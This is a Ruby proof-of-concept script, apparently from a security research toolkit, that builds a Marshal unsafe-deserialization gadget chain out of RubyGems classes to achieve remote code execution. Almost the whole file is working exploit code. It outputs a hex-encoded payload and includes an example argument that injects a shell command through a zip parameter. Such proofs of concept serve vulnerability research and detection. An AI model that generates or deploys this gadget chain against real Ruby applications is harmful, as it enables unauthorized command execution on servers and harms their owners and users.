# Disclaimer:
# This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, 
# and is not intended to be used to attack systems except where explicitly authorized.
# Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

# This Ruby marshall unsafe deserialization proof of concept is originally based on: https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
# It was observed to work up to Ruby 3.4-rc
# The majority of this chain was taken from https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.2.4/marshal-rce-ruby-3.2.4.rb

# This module is required since the URI module is not defined anymore.
# The assumption is that any web framework (like sinatra or rails) will require such library
# Hence we can consider this gadget as "universal"
require 'net/http'

Gem::SpecFetcher # Autoload 

def git_gadget(executable, second_param)
  git_source = Gem::Source::Git.allocate
  git_source.instance_variable_set("@git", executable)
  git_source.instance_variable_set("@reference", second_param)
  git_source.instance_variable_set("@root_dir", "/tmp")
  git_source.instance_variable_set("@repository", "any")
  git_source.instance_variable_set("@name", "any")

  spec = Gem::Resolver::Specification.allocate
  spec.instance_variable_set("@name", "any")
  spec.instance_variable_set("@dependencies",[])

  git_spec = Gem::Resolver::GitSpecification.allocate
  git_spec.instance_variable_set("@source", git_source)
  git_spec.instance_variable_set("@spec", spec)

  spec_specification = Gem::Resolver::SpecSpecification.allocate
  spec_specification.instance_variable_set("@spec", git_spec)

  return spec_specification
end

def command_gadget(zip_param_to_execute)
  git_gadget_create_zip = git_gadget("zip", "/etc/passwd")
  git_gadget_execute_cmd = git_gadget("zip", zip_param_to_execute)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [git_gadget_create_zip, git_gadget_execute_cmd])

  lockfile = Gem::RequestSet::Lockfile.new('','','')
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies",[])

  return lockfile
end


# This is the major change compared to the other gadget.
# Essentially the Gem::Specification is calling safe_load which blocks the execution of the chain.
# Since we need a gadget that calls to_s from (marshal)_load, i've opted for Gem::Version
# The only problem with this is the fact that it throws an error, hence two separate load are required.
def to_s_wrapper(inner)
  spec = Gem::Version.allocate
  spec.instance_variable_set("@version", inner)
  # spec = Gem::Specification.new
  # spec.instance_variable_set("@new_platform", inner)
  return spec
end

# RCE
def create_rce_gadget_chain(zip_param_to_execute)
  exec_gadget = command_gadget(zip_param_to_execute)

  return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(exec_gadget)])
end

# You can comment from here if you want to simply detect the presence of the vulnerability.
#For example: zip_param_to_execute = "-TmTT=\"$(id>/tmp/marshal-poc)\"any.zip"
zip_param_to_execute = "{ZIP_PARAM}"
rce_gadget_chain = create_rce_gadget_chain(zip_param_to_execute)

puts rce_gadget_chain.unpack("H*")

# Marshal.load(rce_gadget_chain)
